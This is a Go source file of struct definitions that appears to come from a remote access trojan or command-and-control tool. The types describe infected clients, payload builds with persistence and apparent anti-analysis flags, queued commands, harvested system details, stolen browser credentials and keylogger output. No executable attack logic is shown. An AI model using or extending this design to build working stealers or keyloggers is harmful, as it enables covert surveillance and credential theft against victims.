package common

import "time"

type Client struct {
	ClientID string `json:"clientID"`
	OS       string `json:"os"`
	Hostname string `json:"hostname"`
	BuildID  string `json:"buildID"`
}

type ClientDB struct {
	ClientID   string `json:"clientID"`
	ClientName string `json:"clientName"`
	OS         string `json:"os"`
	Hostname   string `json:"hostname"`
	IP         string `json:"ip"`
	BuildID    string `json:"buildID"`
	ReceivedAt int64  `json:"receivedAt"`
	LastSeen   int64  `json:"lastSeen"`
}

type Build struct {
	BuildID     string
	IP          string
	Port        string
	OS          string
	Arch        string
	Persistence bool
	CreatedAt   int64
}

type Command struct {
	ClientID  string
	Command   string
	Status    string
	CreatedAt int64
}

type BuildConfig struct {
	OS           string
	Arch         string
	IP           string
	ServerDomain string
	Port         string
	ANTITECH     bool
	Persistence  bool
}

type SystemInfo struct {
	OS          string `json:"os"`
	Hostname    string `json:"hostname"`
	Username    string `json:"username"`
	HomeDir     string `json:"home_dir"`
	Shell       string `json:"shell"`
	CPUInfo     string `json:"cpu_info"`
	MemoryInfo  string `json:"memory_info"`
	DiskInfo    string `json:"disk_info"`
	NetworkInfo string `json:"network_info"`
}

type ShowSystemInfo struct {
	ClientID    string `json:"clientID"`
	OS          string `json:"os"`
	Hostname    string `json:"hostname"`
	Username    string `json:"username"`
	HomeDir     string `json:"home_dir"`
	Shell       string `json:"shell"`
	CPUInfo     string `json:"cpu_info"`
	MemoryInfo  string `json:"memory_info"`
	DiskInfo    string `json:"disk_info"`
	NetworkInfo string `json:"network_info"`
	ReceivedAt  int64  `json:"received_at,omitempty"`
}

type BrowserData struct {
	ClientID  string `json:"client_id"`
	Browser   string `json:"browser"`
	DataType  string `json:"data_type"`
	URL       string `json:"url"`
	Title     string `json:"title"`
	Username  string `json:"username"`
	Password  string `json:"password"`
	Value     string `json:"value"`
	Date      string `json:"date"`
	Timestamp int64  `json:"timestamp,omitempty"`
}

type KeyLogData struct {
	ClientID string    `json:"client_id"`
	Key      string    `json:"key"`
	Window   string    `json:"window"`
	Time     time.Time `json:"time"`
	KeyState string    `json:"state"`
}
